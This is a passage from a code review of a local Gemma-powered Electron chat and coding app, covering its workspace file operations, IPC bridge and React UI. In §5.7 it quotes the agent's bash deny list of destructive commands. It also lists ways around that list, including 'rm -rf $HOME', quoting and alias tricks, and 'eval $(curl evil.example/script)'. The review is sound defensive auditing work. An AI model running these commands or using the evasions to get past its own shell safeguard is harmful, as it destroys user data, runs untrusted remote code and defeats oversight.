Used by `index.ts:handleChat` (code mode) to tell the system prompt the preview URL, and by `Canvas.tsx` (verify §8) to point its iframe.

### Placeholder + directory-list renderers (lines 178–226)

Dark-themed HTML, inline styles. The placeholder shows a folder icon and "Ask Gemma to create `index.html`". The directory list is a simple `<ul>` of links. `escapeHtml` (lines 220–226) handles the obvious entity-escape on filenames.

## 5.4 `listTree(base, max=200)` (lines 234–268)

Recursive walk of a directory tree, returning `FileEntry[]` (`{ path, kind, size? }`).

- **Skips dotfiles** (`if (e.name.startsWith('.'))`) — `.git`, `.DS_Store`, etc.
- **Skips `node_modules`** — explicit filter at line 250.
- **Sorts: directories first**, then alphabetical.
- **Hard cap at `max`** (default 200) — when reached, walking stops mid-directory. This is checked at the top of `walk` *and* inside the for-loop, so the cap is respected even if a single directory has > 200 entries.
- **Gracefully handles unreadable directories** — `try { readdir }` returns silently.
- For files, attempts to `stat` for the `size` field; on failure, omits size but still includes the entry.

Used by:
- `tools.ts:listFiles` (max 200).
- `index.ts:workspace:list` IPC handler (max 300).

Two distinct callers using different caps. Captured as low-priority §Hardening — consolidate to a single constant.

## 5.5 `wsWriteFile` (lines 270–282)

```ts
const tmp = target + '.tmp-' + Date.now()
await writeFile(tmp, content, 'utf-8')
await rename(tmp, target)
```

**Atomic write via temp + rename.** This is exactly the right primitive for the live-streaming case where `wsWriteFile` may be called many times in rapid succession with growing content — a partial write to the real path would corrupt the file the Canvas iframe is rendering. Renames are atomic on POSIX within the same filesystem.

Also mkdir's parent dirs (line 277), so `wsWriteFile(conv, 'src/components/Foo.tsx', ...)` creates `src/` and `src/components/` as needed.

Returns the absolute target path. Caller doesn't actually use this return value (`tools.ts:writeFile` returns its own formatted message).

## 5.6 `wsReadFile` and `wsEditFile`

### `wsReadFile` (lines 284–288)

Trivial: ensureWorkspace, assertInWorkspace, return `readFile(target, 'utf-8')`.

### `wsEditFile` (lines 290–314) — the find-and-replace contract

Two code paths:

**`replaceAll === true`:**
1. `content.split(oldString)`. If only one part → `oldString` wasn't found → throw `"old_string not found"`.
2. Otherwise `parts.join(newString)`, write back. Returns `{ occurrences: parts.length - 1 }`.

**`replaceAll === false` (default):**
1. `indexOf(oldString)`. If not found → throw.
2. **Look for a second occurrence** at `idx + oldString.length`. If found → throw `"old_string appears multiple times in <path>. Use replace_all or add context."`
3. Splice-replace at the single occurrence. Returns `{ occurrences: 1 }`.

**This mirrors the Claude Code Edit tool contract exactly** — uniqueness-or-throw is the discipline that prevents the model from accidentally editing the wrong instance of a generic substring. Worth preserving as-is.

## 5.7 `wsDeleteFile` (lines 316–320) and `wsRunBash` (lines 322–397)

### `wsDeleteFile`

```ts
await rm(target, { recursive: true, force: true })
```

Recursive + force. Bounded by `assertInWorkspace`, so it cannot delete anything outside the workspace. **One call deletes a whole subtree** — combined with `delete_file`'s no-confirmation tool behavior (§4.2.8), the agent can wipe the workspace in a single action. Bounded blast radius, but worth a §Hardening item to require a `confirm=true` arg for directory deletes.

### `wsRunBash` — the trust boundary

```ts
const BASH_DENY =
  /\b(rm\s+-rf\s+\/|sudo|:\(\)\s*\{|chmod\s+777\s+\/|mkfs|dd\s+if=|shutdown|reboot)/i
```

Six patterns the deny regex catches:
- `rm -rf /` (literal root wipe)
- `sudo` (any sudo invocation)
- `:(){...}` (the classic fork bomb)
- `chmod 777 /`
- `mkfs` (filesystem creation)
- `dd if=` (raw disk write)
- `shutdown`, `reboot`

If matched: throw `'Blocked by safety policy: command contains a denied pattern.'`

**This is shallow defense.** Evasions are trivial:
- `rm -rf $HOME` — not matched (`$HOME` is not literal `/`)
- `bash -c "<destructive>"` — outer command doesn't contain the destructive token
- `eval $(curl evil.example/script)` — no denied tokens in the visible command
- `r''m -rf /` — shell quoting evades the regex
- A wrapper invocation that shells out from Python or Ruby — no denied tokens at all
- `alias safedelete='rm -rf'; safedelete /` — alias indirection
- `$(echo rm) -rf /` — command substitution

The deny regex catches **only** copy-pasted obviously-destructive commands. It does not constitute a sandbox. A motivated adversarial input (whether from a user, a tool result, or a misbehaving model) routes around it without effort.

**Spawn details:**
- `/bin/bash -lc <command>` — login shell. Sources `.bash_profile` / `.bashrc`. Inherits the user's full shell environment including aliases and PATH.
- `cwd: base` — set to the workspace dir. But the command can `cd` elsewhere.
- `env: { ...process.env, FORCE_COLOR: '0', NO_COLOR: '1' }` — disables color codes (cleaner output for the model to parse).
- **Output cap: 16,000 bytes** per stream. Beyond that: truncated, `\n[…output truncated]` appended.
- **Timeout: 60_000 ms default.** SIGKILL on expiry.
- Returns `{ exitCode, stdout, stderr, truncated, durationMs }`.

**The implication for your stated goals:** the existing pattern is "the model is trusted within the workspace, and there's a thin speed bump against the most embarrassing destructive commands." For a single-user dev tool driven by a local model with a single human user, this is defensible. For:
- A Skills feature where Skills can themselves spawn shells
- Approved-basis filesystem access that widens the workspace to real user dirs
- Any sharing of conversations or templates between users

…the threat model changes significantly. The path forward (captured for §Hardening) is: deny-by-default with user approval gating for `run_bash`, plus a real sandbox (e.g., `sandbox-exec` on macOS, which is built-in) for the actual execution. We don't have to design that today — but we should know what we're inheriting.

## §5 Synthesis

1. **The path-bounded primitives are well-designed.** `assertInWorkspace` + atomic temp/rename writes + uniqueness-enforced edits are all the right shapes. Preserve.
2. **The HTTP server is small, focused, and correctly bound to localhost.** Wide-open CORS is a misalignment (captured) but the blast radius is bounded by 127.0.0.1.
3. **`wsRunBash` is the real risk.** Deny regex is a speed bump, not a sandbox. This is the central security item for the Skills + approved-FS work.
4. **No file watcher.** Filesystem mutations are signaled only when our own code calls `ctx.onFileChange?.()`. If something *outside* the app modifies the workspace (e.g., the user opens it in Finder and edits), the renderer never knows. Captured for §Hardening — a chokidar-style watcher would close that loop.
5. **The HTTP server's directory listing renders user-controlled filenames** with `escapeHtml`. Correctly escaped. No XSS risk via filenames in the listing UI.
6. **HF cache (`<userData>/mlx/models`) and workspaces (`<userData>/workspaces`) are siblings** under userData. Each is independently deletable for "fresh start" purposes — clean separation.

---

# Section 6 — Preload Bridge: `src/preload/`

**Files:** `src/preload/index.ts` (90 lines), `src/preload/index.d.ts` (7 lines).

**Role:** The TypeScript-typed `contextBridge` exposing the main-process IPC surface to the renderer as `window.api`. This is the *complete* set of operations the renderer can perform; if a function isn't here, the renderer cannot reach it. After §1.6 (shared types) and §2.7 (IPC handler registry), this file completes the IPC contract triangle.

## 6.1 `src/preload/index.ts`

### Imports

Type-only imports from `../shared/types`. **Uses relative path** rather than the `@shared` alias — same minor inconsistency flagged in §2.1.

### The `api` object — 15 methods

#### Setup & MLX

| Method | Wraps | Direction |
|---|---|---|
| `startSetup(model)` | `ipcRenderer.invoke('setup:start', model)` | renderer → main, void |
| `switchModel(model)` | `invoke('model:switch', model)` | renderer → main, void |
| `checkMLX()` | `invoke('setup:status')` | renderer → main, returns `{ hasMLX: boolean }` |
| `onSetupStatus(cb)` | `on('setup:status', ...)` | main → renderer, returns unsubscribe fn |

`onSetupStatus` returns a **cleanup function**. Standard React-friendly pattern: `useEffect(() => api.onSetupStatus(setStatus), [])` works correctly.

#### Models & chat

| Method | Wraps | Direction |
|---|---|---|
| `listLocalModels()` | `invoke('models:list-local')` | returns `string[]` |
| `sendChat(req, onChunk)` | composite (see below) | streaming |
| `abortChat(conversationId)` | `invoke('chat:abort', conversationId)` | void |
| `listTools()` | `invoke('tools:list')` | tool metadata |
| `transcribeAudio(base64, model)` | `invoke('audio:transcribe', { base64, model })` | returns `{ text: string }` (always empty — see §2.7) |

`sendChat` is the most interesting method in this file (lines 25–37). Three steps:
1. Invoke `chat:send`, await the returned channel name (`chat:stream:${conversationId}`).
2. Set up a listener on that dynamic channel.
3. For each chunk, call the consumer's `onChunk`. On terminal (`done` or `error`), remove the listener and resolve the outer promise.

**Single Promise wraps the entire stream.** The renderer's `Chat.tsx` can `await api.sendChat(req, handleChunk)` and the await resolves only when the stream terminates. Clean abstraction.

**Two implications for the lying-spinner cousin failure on chat:**
- If the stream never emits `done` or `error`, the listener is never removed and the promise never resolves. There is **no client-side timeout**. A hung main-side `handleChat` (e.g., if `mlx_vlm.server` stops responding mid-stream) leaves this promise hanging forever from the renderer's view too. Captured for §Hardening.
- The `await` could be a useful place to enforce a renderer-side dead-man timer (`Promise.race([sendChatPromise, timeoutPromise])`) without changing the main process at all.

#### Workspace

| Method | Wraps |
|---|---|
| `getWorkspace(conv)` | `invoke('workspace:info', conv)` → `WorkspaceInfo` |
| `listWorkspace(conv)` | `invoke('workspace:list', conv)` → `WorkspaceFile[]` |
| `openWorkspace(conv)` | `invoke('workspace:open-external', conv)` → void |
| `workspaceServerPort()` | `invoke('workspace:server-port')` → `number` |
| `onWorkspaceChanged(cb)` | `on('workspace:changed', ...)` → unsubscribe |

#### Debug / streaming

| Method | Channel |
|---|---|
| `onRawChunk(cb)` | `chat:raw` (devtools-only raw token stream) |
| `onFileStreaming(cb)` | `file:streaming` (live write_file content for Canvas) |

### `contextBridge.exposeInMainWorld('api', api)` (line 88)

Exposes the entire `api` object on `window.api` in the renderer's main world (not isolated world). **Because `contextIsolation: true`** is set in `index.ts:69`, this is the *only* way data crosses from preload into renderer — direct global access is blocked.

### `export type Api = typeof api` (line 90)

Exported so `index.d.ts` can read the shape.

## 6.2 `src/preload/index.d.ts`

Augments the global `Window` interface so renderer TypeScript code sees `window.api` typed correctly. This is what lets the renderer get autocomplete and type-check against the bridge without re-declaring shapes.

## §6 Synthesis

1. **The IPC contract is closed and complete.** Every channel registered in `index.ts` (§2.7) is exposed in preload; the inverse is also true (no orphan handles in main, no fictitious methods in preload). This is the kind of consistency that's easy to lose during fast iteration — worth preserving as we add Skills/filesystem features.
2. **`sendChat`'s no-timeout design is the cousin failure to the lying spinner.** A hung main-side chat leaves the renderer's `await` hanging too. Adding a renderer-side `Promise.race` with a generous-but-bounded timeout is a small-effort, high-impact fix.
3. **The bridge is the right place to add per-tool approval UX.** A new method like `approveAction(callId, decision)` would let `tools.ts:runTool` block on user input — the IPC plumbing already supports invoke/return semantics for this.
4. **`Api = typeof api` is a clean self-typing pattern.** No duplication between the implementation and the type declaration. We should preserve this when adding methods — add the new method to `api`, the type auto-updates, the renderer's TS sees it immediately.
5. **For Skills + filesystem-access additions, the natural new methods are:**
   - `listSkills(): Promise<SkillManifest[]>` / `installSkill(...)` / `uninstallSkill(...)`
   - `requestFilesystemAccess(path: string): Promise<{ granted: boolean }>` (the approved-basis gate)
   - `listApprovedPaths(): Promise<string[]>`
   - `revokeApprovedPath(path: string): Promise<void>`

   Each one new method here + new handler in §2.7 + new `ToolSpec` entries in §4 = a complete vertical slice.

Section 6 complete. Section 7 (renderer entry + Setup/Chat/App — the deep dive on the lying-spinner UI) is next.

---

# Section 7 — Renderer: Entry, App, Setup, Chat

**Files in this section:**
- `src/renderer/index.html` (13 lines) — HTML shell + CSP
- `src/renderer/src/main.tsx` (10 lines) — React entry
- `src/renderer/src/App.tsx` (161 lines) — top-level state machine, routes between Setup and Chat
- `src/renderer/src/components/Setup.tsx` (232 lines) — first-run/welcome + the stage progress UI (the lying-spinner screen)
- `src/renderer/src/components/Chat.tsx` (591 lines) — conversation surface, stream consumer, layout

These four files together are 994 lines and own the entire user-facing experience. Anywhere the user is confused, frustrated, or stuck, the cause lives here or just below in the IPC bridge.

## 7.1 `src/renderer/index.html` — and a correction to §2

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  style-src 'self' 'unsafe-inline';
  script-src 'self' 'wasm-unsafe-eval' blob:;
  worker-src 'self' blob:;
  font-src 'self' data:;
  img-src 'self' data: https: http://127.0.0.1:*;
  frame-src http://127.0.0.1:*;
  connect-src 'self' ws: http://127.0.0.1:*
    https://huggingface.co https://*.huggingface.co https://*.hf.co
    https://cdn-lfs.huggingface.co https://cdn.jsdelivr.net;
" />
```

**Correction to §2.2:** I claimed there's no CSP anywhere. That was wrong — CSP is set here via meta tag (just not via Electron's `session` API). The policy is real and meaningful:

- `default-src 'self'` — locks down everything by default to same-origin.
- `style-src 'self' 'unsafe-inline'` — inline styles allowed (Tailwind generates many, plus the workspace HTTP server's placeholder/directory pages use inline styles when rendered in iframes — wait, no, the iframe has its own document, so inline style there is gated by its own CSP, which is none. Still: the renderer-side inline styles are why this is needed).
- `script-src 'self' 'wasm-unsafe-eval' blob:` — `wasm-unsafe-eval` is for `@huggingface/transformers` WASM kernels; `blob:` is for worker construction.
- `worker-src 'self' blob:` — same, workers from blob URLs.
- `font-src 'self' data:` — `data:` URIs for inline fonts.
- `img-src 'self' data: https: http://127.0.0.1:*` — wildcard `https:` is loose (any HTTPS image) but plausibly needed for `fetch_url` results that contain remote images in chat history. Localhost wildcard covers the workspace HTTP server's served images.
- `frame-src http://127.0.0.1:*` — the Canvas iframe loads from the workspace server only.
- `connect-src` — `self`, websockets (for Vite dev HMR), localhost (workspace server), HF domains (model downloads from in-renderer transformers.js if ever used), and `cdn.jsdelivr.net` (likely for the `@huggingface/transformers` package's auxiliary fetches).

**The `img-src https:` wildcard is the only meaningfully loose entry.** Tightening it would require enumerating expected image sources. Captured as low-priority §Hardening — the alternative (block `https:` images outright) is too restrictive for the chat feature.

**No `script-src` permits any external CDN** — all JS executes from the renderer bundle or in-process. Good.

`<div id="root"></div>` + `<script type="module" src="/src/main.tsx"></script>` is standard React/Vite shape.

## 7.2 `src/renderer/src/main.tsx` — React entry

```tsx
createRoot(document.getElementById('root')!).render(
  <StrictMode>
    <App />
  </StrictMode>
)
```

Standard React 19 mount. **StrictMode is on**, which means in dev mode every component renders + cleans up + re-renders to catch subscription bugs. This is relevant for `App.tsx`'s setup-status subscription (§7.3) — the double-render in StrictMode means the subscribe/unsubscribe pair runs twice, which can mask order-of-operations bugs that only surface in production. Worth knowing.

`styles.css` (Tailwind + custom) is imported here.

## 7.3 `src/renderer/src/App.tsx` — the top-level state machine

### State shape (lines 6–11)

```ts
type AppState =
  | { phase: 'boot' }
  | { phase: 'setup'; status: SetupStatus; model: string }
  | { phase: 'ready'; model: string }
  | { phase: 'switching'; model: string; toModel: string; status: SetupStatus }
```

Four phases. Discriminated by `phase`. Stored as a single `useState`.

- **`boot`**: just-mounted, nothing decided. Shows `BootSplash` (a shimmer line).
- **`setup`**: first-run, install-in-progress, model download, or post-error. Shows `Setup`.
- **`ready`**: Setup completed; shows `Chat`.
- **`switching`**: user picked a different model while in `ready`; shows `Chat` (so they keep their context visible) with a modal `SwitchingOverlay`.

### Mount effect (lines 15–73)

Runs once on mount.

1. **Subscribes to `onRawChunk`** — forwards raw model tokens to `console.log('[gemma]', chunk)` for devtools debugging. The only consumer of `chat:raw` (see §2.7).
2. **Subscribes to `onSetupStatus`** — the meaty handler (lines 23–45):
   - On `stage === 'ready'`: transition to `ready` phase. If previous was `switching`, use `toModel`; if previous was `setup`, use that model; otherwise fall back to `DEFAULT_MODEL`.
   - On `stage === 'error'` while `switching`: revert to `ready` with the previous model (so a failed switch doesn't dump the user back to Setup — they keep the model they had).
   - If currently `switching`: keep `switching` phase, update its `status`.
   - Otherwise (default for all other transitions): go to `setup` phase.
3. **Auto-start logic** (lines 47–67):
   - List local models via `api.listLocalModels()`.
   - Check if `DEFAULT_MODEL` (or any version-suffixed variant like `DEFAULT_MODEL:v2`) is among them.
   - If yes, and `api.checkMLX()` reports `hasMLX: true` — auto-start setup immediately (no Welcome screen). State goes to `{ phase: 'setup', stage: 'starting-mlx', ... }`.
   - If either check fails: stop at `{ stage: 'checking', message: 'Welcome' }` which `Setup.tsx` interprets as "show the Welcome screen."
4. **Cleanup:** unsubscribes both listeners on unmount.

**StrictMode side-effect:** In dev, the cleanup-then-rerun pattern fires `unsub()` mid-init, then the second mount re-subscribes. This is correct under React 19 — the listeners support repeated subscribe/unsubscribe — but if `api.listLocalModels()` or `api.checkMLX()` is slow, the first call's `setState` may land *after* the second mount's `unsub` already fired, depending on ordering. In practice the listener pattern is robust to this; worth knowing during debugging.

### `handleSwitchModel` (lines 75–87)

Guard: only switches if currently `ready` and the model actually changed. Otherwise transitions to `switching` phase and calls `api.switchModel`. The eventual `setup:status: 'ready'` brings us to `ready` with `toModel`; an `error` brings us back to `ready` with the previous model.

### Render branches (lines 89–128)

- `boot` → `<BootSplash />` (shimmer bar centered)
- `setup` → `<Setup status model onModelChange onStart />`. `onStart` triggers `api.startSetup(model)` and resets state to `checking`.
- `switching` → `<Chat>` + `<SwitchingOverlay status>` (a modal with the same progress UI as Setup, but overlaid so the conversation stays visible).
- `ready` → `<Chat>` alone.

The `key="setup" | "switching" | "chat"` on the outer divs is what triggers the fade-in animations on phase transitions.

### `SwitchingOverlay` (lines 139–161)

Fixed full-screen modal with a backdrop blur. Shows the status message and a progress bar if `progress != null && > 0`. **Identical lying-spinner risk** — if a model switch stalls, this overlay sits on top of the chat indefinitely with no client-side timeout.

## 7.4 `src/renderer/src/components/Setup.tsx` — the lying-spinner UI

### Top-level (`Setup`, lines 23–84)

Two branches:
1. `status.stage === 'checking' && status.message === 'Welcome'` → render `<WelcomeScreen>`. (This is the magic-message convention to distinguish "the user just opened the app for the first time" from "we're in the middle of a setup operation that's currently in the checking stage." Captured for §Hardening — a real enum/explicit flag would be clearer than the string-match.)
2. Otherwise → render the "Setting things up" screen with `<StageList>`, optional progress bar, and the error block.

### `WelcomeScreen` (lines 86–156)

The model picker. Renders all four `AVAILABLE_MODELS` with their label, size badge, "Recommended" pill, and description. Selected model gets a brighter border. Bottom button: `Download {selectedLabel} · {selectedSize}` → calls `onStart(selected.name)` which triggers `api.startSetup`.

**Default selected:** `AVAILABLE_MODELS[1]` — the E4B model (matches `DEFAULT_MODEL` in shared types). Defensive — the user can pick any model from the list.

### `StageList` (lines 158–200) — the central UI for the lying spinner

Renders four stages: `installing-mlx`, `starting-mlx`, `downloading-model`, `ready`. For each, computes its visual state by comparing the stage's order index against `order.indexOf(status.stage)`:
- `idx < currentIdx` → done (white checkmark)
- `idx === currentIdx` → active (pulsing white dot)
- `idx > currentIdx` → pending (empty circle)

The active stage shows `status.message` instead of its default label. So during a download stall, the user sees:
- Install MLX runtime → done ✓
- Start runtime & load model → done ✓
- Download model → **active, pulsing**, text: "Loading Gemma 4 E4B… (first run downloads the model)" or some HF tqdm message
- Ready to chat → pending

Plus a progress bar at 12% that doesn't move.

**This is what the user sees during the HF Xet stall** (§3.6's Case B). **No element in this UI hints that anything might be wrong.** The pulsing dot communicates "we're working on it"; the progress bar communicates "we know where you are"; the message communicates "this is normal." All three are wrong.

### Error block (lines 68–79)

When `status.stage === 'error'`: shows a red-bordered box with `status.error` and a "Try again" button that calls `onStart(model)` again. So once we DO eventually hit the 10-min `waitForHealth` timeout (or detect the subprocess crash), the user gets a clean retry path.

### Hardening — concrete recipe for fixing the lying spinner in this file

A minimal client-side fix (~25 lines added to `Setup.tsx`) would:
1. Capture the timestamp of the last meaningful `status` update (anything that changes `progress` or `message`).
2. Run a `setInterval` that compares `Date.now() - lastUpdate`.
3. If > 30 seconds while `isWorking` and `progress < 1`, render a yellow warning under the progress bar: "This is taking longer than expected. Check console for details, or click Try again if you'd like."
4. If > 90 seconds, surface a more prominent banner with an explicit "Cancel and retry" option.

Combined with the `HF_HUB_ENABLE_HF_TRANSFER=1` fix in §3, this would convert the worst user experience the app has into a recoverable one.

## 7.5 `src/renderer/src/components/Chat.tsx` — the 591-line conversation surface

This is the largest renderer file and owns the entire chat experience: conversation list, message rendering, streaming consumption, model picker, mode toggle, canvas resize, suggestions empty state. Five distinct concerns interleaved in one file.

### 7.5.1 `Conversation` type and persistence (lines 14–53)

```ts
interface Conversation {
  id: string
  title: string
  messages: ChatMessage[]
  createdAt: number
  mode: AgentMode
  canvasOpen?: boolean
}
```

Persisted to `localStorage[STORAGE_KEY]` where `STORAGE_KEY = 'gemma-chat:conversations:v2'`. The `:v2` suffix implies a prior schema migration (v1 → v2). `loadConversations` defensively backfills `mode ?? 'code'` for any pre-mode v2 records.

`newConversation`:
- `id` shape: `c_${Date.now()}_${rand6}` — **identical pattern to what the main process uses for workspace dirs** (§5). This is what ties a Chat conversation to its workspace.
- Default `mode: 'code'`, `canvasOpen: mode === 'code'` — Build mode opens the Canvas by default.

### 7.5.2 State (lines 60–66)

```ts
const [conversations, setConversations] = useState(...)
const [activeId, setActiveId] = useState(...)
const [streaming, setStreaming] = useState(false)
const streamRef = useRef<{ abort: boolean }>({ abort: false })
```

- `streamRef.abort` is a mutable flag for in-flight chunk rejection. Set true by `handleStop`. Each chunk handler short-circuits if `streamRef.current.abort` is true. **Does not actually abort the underlying request** — `api.abortChat` does that. The ref just prevents UI updates after the user clicked Stop.

### 7.5.3 `saveConversations` on every change (lines 73–75)

```ts
useEffect(() => { saveConversations(conversations) }, [conversations])
```

**This runs on every keystroke during streaming**, since each token chunk mutates `conversations` (via setState). For a long-running tool-heavy generation, that's thousands of `JSON.stringify` + `localStorage.setItem` calls. Captured for §Hardening — debounce to ~500ms. localStorage is small (5–10 MB depending on browser); a sufficiently long conversation could exceed the quota, in which case `setItem` throws silently (the `catch` block).

### 7.5.4 `handleSend(input)` (lines 111–202) — the central streaming consumer

The choreography:

1. **Guard:** `!input.trim() || streaming` → no-op.
2. **Build messages:**
   - `userMsg` with the input.
   - `assistantMsg` empty, with `activity: { kind: 'thinking' }`.
3. **Update conversation:**
   - If conversation has no messages yet, derive `title` from the first 48 chars of the user input.
   - Append both messages.
4. **Build history** for the IPC request: maps `conv.messages + [userMsg]` to the `{role, content, toolCalls}` shape `ChatRequest` expects.
5. **Set `streaming: true`**, reset `streamRef.current.abort = false`.
6. **`await api.sendChat(req, onChunk)`** with a closure-over-state chunk handler.

The chunk handler is the discriminated-union switch:
- `'token'`: append `chunk.text` to the last (assistant) message's `content`.
- `'tool_call'`: push the call onto the assistant's `toolCalls`, with `running: true`.
- `'tool_result'`: find by `id`, clear `running`, set `result`/`error`.
- `'activity'`: replace the assistant's `activity`.
- `'done'`: mark `done: true`, activity → `idle`.
- `'error'`: mark `done`, activity `idle`, append `\n\n⚠️ {error}` to content.

**Implementation pattern worth flagging:** the entire chunk handler is **one giant `setConversations` per chunk**. Each chunk triggers a top-level state update, a re-render of the conversation list, and (per the useEffect above) a localStorage write. For a 4000-token generation that's 4000 state updates. Captured for §Hardening — batching tokens via `requestAnimationFrame` or a buffered ref would significantly reduce render pressure, especially noticeable on the Build tab where Canvas re-renders on `workspace:changed`.

`finally`: `setStreaming(false)`. Always runs.

**No client-side timeout on the await.** This is the cousin failure to the lying spinner: if `sendChat`'s underlying stream never emits `done` or `error`, the await hangs forever and the user is stuck in `streaming: true` state with no way to escape except `handleStop`. The stop button exists in the Composer, so the user has recourse — but a graceful timeout would be a smaller cognitive load.

### 7.5.5 `handleStop` (lines 204–208) and `handleRegenerate` (lines 210–224)

- **Stop:** set `streamRef.abort = true`, call `api.abortChat`, set `streaming: false`. The abort propagates to main's `AbortController` (§2.7) which causes the underlying fetch to MLX to throw `AbortError`, which `handleChat` (§2.5) maps to a clean `done` chunk.
- **Regenerate:** find the last user message, pop everything from there back through (and including) the user message itself, then `setTimeout(() => handleSend(lastUser.content), 0)`. The setTimeout 0 defers the resend until after React processes the pop. Standard pattern.

### 7.5.6 `ResizableCanvas` (lines 280–333)

Pointer-event-based horizontal resize. Min 320px, max 900px. `setPointerCapture` ensures the drag continues even if the pointer leaves the handle. Initial width 520px. **The width is not persisted** — closing and reopening the Canvas resets to 520. Captured for §Hardening, minor.

### 7.5.7 `Header` (lines 335–446)

- macOS drag region (`drag` class) wrapping the whole header.
- Center: mode pills (Chat/Build) — a tiny segmented control.
- Right: model picker dropdown + Canvas toggle (only in Build mode).
- Model picker: opens on click, closes on outside click (via document-level mousedown listener). Lists all `AVAILABLE_MODELS` with the active one marked with an emerald check.

### 7.5.8 `MessageList` (lines 469–525)

- `useEffect` tracks "are we at the bottom?" via scroll listener (within 40px counts as "at bottom").
- On `messages` change, if `atBottomRef.current` is true, scroll to bottom. **This is the right pattern** — only auto-scroll if the user hasn't scrolled up to read earlier content. Common chat-UX trap successfully avoided.
- Empty → `<EmptyState mode />`.
- Otherwise: maps messages to `<Message>` components in a max-w-3xl column. Each gets a stagger animation delay based on index.

### 7.5.9 `EmptyState` (lines 527–591)

Big "What should we build?" / "How can I help?" headline + 4 suggestion cards per mode.

**Suggestion-click hack** (lines 570–581):
```ts
const ta = document.querySelector<HTMLTextAreaElement>('[data-composer]')
if (ta) {
  const setter = Object.getOwnPropertyDescriptor(
    window.HTMLTextAreaElement.prototype, 'value'
  )?.set
  setter?.call(ta, s.prompt)
  ta.dispatchEvent(new Event('input', { bubbles: true }))
  ta.focus()
}
```

This is the React-rebellion pattern for setting an input's value while triggering React's onChange. It works by using the native HTMLTextAreaElement setter (bypassing React's synthetic value tracker), then dispatching a synthetic input event that React picks up.

**Cross-cutting coupling:** assumes `Composer` renders a `<textarea data-composer>`. Verified in §8. The hack works but it's a Demeter violation — `EmptyState` reaches across the component boundary to manipulate `Composer`'s internal DOM. Captured for §Hardening — lift "set composer text" to a ref or context. Minor; works correctly today.

## §7 Synthesis

1. **`index.html` has a CSP and it's mostly tight.** Corrects my §2 oversight. Only meaningful loose entry is `img-src https:`. The CSP is the strongest production security control the renderer has — preserve it carefully across edits.
2. **The `App` state machine is sound but the switching-error revert is the one place it gets clever.** Failed model switches preserve the previous model; failed first-setups go back to Welcome. Worth documenting for future maintainers (which is what §7.3 does).
3. **Setup's StageList is the lying spinner's face.** The fix-recipe in §7.4 is small (~25 lines) and gives the user agency. Pair it with `HF_HUB_ENABLE_HF_TRANSFER=1` from §3 and the worst UX in the app is resolved.
4. **Chat.tsx is the right place for the streaming-await timeout.** A `Promise.race` between `api.sendChat(...)` and a generous timeout (90–120 s without any chunk arrival) would close the cousin failure cleanly.
5. **High-frequency state updates during streaming are a perf concern.** Each token = one setConversations + one localStorage write. Batching to rAF or 100ms windows would significantly reduce render pressure, especially in Build mode with the Canvas re-rendering on each `workspace:changed`.
6. **The suggestion-click DOM hack is a small wart.** Easy to clean up via a `composerRef` lifted to Chat. Low priority.
7. **`canvasVisible` logic on line 226 is over-complicated.** `(mode === 'code' || canvasOpen === true) && canvasOpen !== false` simplifies to `canvasOpen !== false && (mode === 'code' || canvasOpen === true)` which still has redundancy. The intent appears to be: "Canvas visible unless explicitly closed; default to open in code mode, closed in chat mode." Could be clearer. Captured for §Hardening, cosmetic.

Section 7 complete. Section 8 (Composer, Message, Canvas, Sidebar, whisper — structural depth) is next.

---

# Section 8 — Renderer (structural depth): Composer, Message, Canvas, Sidebar, whisper

**Files:** Composer (283), Message (393), Canvas (349), Sidebar (81), whisper (101) — 1,207 lines.

Structural depth (per the upfront agreement): purpose, key functions, IPC consumed, state held, notable behaviors. Less line-by-line than §§2–7; deep enough to extend safely.

## 8.1 Composer.tsx — input + voice + send/stop

**Purpose:** Textarea with auto-resize, mic-button voice input, send/stop button. The bottom bar of the chat surface.

### State

- `text: string` — current input.
- `recState: 'idle' | 'recording' | 'loading-model' | 'transcribing'`.
- `recordSeconds: number` — elapsed recording time (mm:ss display).
- `recordError: string | null`.
- `modelProgress: { pct, label } | null` — for Whisper model download progress.
- Refs: `taRef` (textarea), `mediaRef` (MediaRecorder), `chunksRef` (Blob[]), `streamRef` (MediaStream), `timerRef` (recording-seconds interval).

### Behavior highlights

- **Auto-resize textarea** (lines 34–40): on every text change, reset height then set to `min(scrollHeight, 220px)`.
- **Enter to send, Shift+Enter for newline, IME composition respected** (`!e.nativeEvent.isComposing`).
- **Mic flow** (lines 56–119):
  1. `navigator.mediaDevices.getUserMedia({ audio: true })` — gated by main's permission handler (§2.6 only grants media/mediaKeySystem).
  2. `pickMime()` tries `audio/webm;codecs=opus` first, then `webm`, `mp4`, `ogg`.
  3. `MediaRecorder.start()`, collect chunks via `ondataavailable`.
  4. On stop: assemble Blob, reject if <500 bytes ("Recording too short"), call `transcribeAudioBlob(blob, onProgress)` from `lib/whisper.ts`.
  5. Result text appended to existing `text` (preserves typed-then-spoken composition).
  6. Cleanup: stop all MediaStream tracks, clear timer, reset state.
- **State-aware UI** — placeholder switches between "Listening…" / "Transcribing…" / default; mic button shows seconds + pulsing red while recording, spinner while loading/transcribing; below the input shows hints, errors, or progress.
- **Composer textarea has `data-composer` attribute** (line 152) — this is the hook the suggestion-click pattern in `Chat.tsx:EmptyState` (§7.5.9) reaches into. Documented coupling.

### Correction to §2.7

§2.7 marked `audio:transcribe` as a "known dead feature" that returns empty text. The IPC handler IS a stub — but **voice transcription itself is fully implemented and working**, just *entirely in the renderer*. Composer calls `transcribeAudioBlob` directly from `lib/whisper.ts` (§8.5), which runs Whisper via `@huggingface/transformers` with WebGPU (WASM fallback). The IPC bridge is unused dead code; the feature is live.

This is a meaningful architectural observation: **the renderer can run ML models in-browser via transformers.js, completely independent of the MLX subprocess.** That capability could be useful for future features (e.g., in-renderer reranking, embedding, classification — anything where the model fits in a few hundred MB and doesn't need full MLX). Captured for §Hardening notes — and the dead IPC handler + bridge method should be removed.

---

## 8.2 Message.tsx — assistant + user message rendering

**Purpose:** Render a single `ChatMessage`. Different layouts for user (right-aligned bubble) vs assistant (logo + markdown + tool calls + activity). Owns the markdown pipeline, the `<thinking>` block extraction, the tool-call card UI, and the rotating-verb activity bar.

### Key subcomponents

- **`parseThinking(content)`** (lines 19–33): extracts `<think>...</think>` or `<thinking>...</thinking>` blocks. Returns `{ thinking, thinkingInProgress, visible }`. Critical for Gemma 4 reasoning output — the model's internal monologue gets surfaced in a collapsible block instead of mixed into the visible response.
- **`Message`** (lines 35–120):
  - User: right-aligned bubble, `whitespace-pre-wrap`, no markdown rendering.
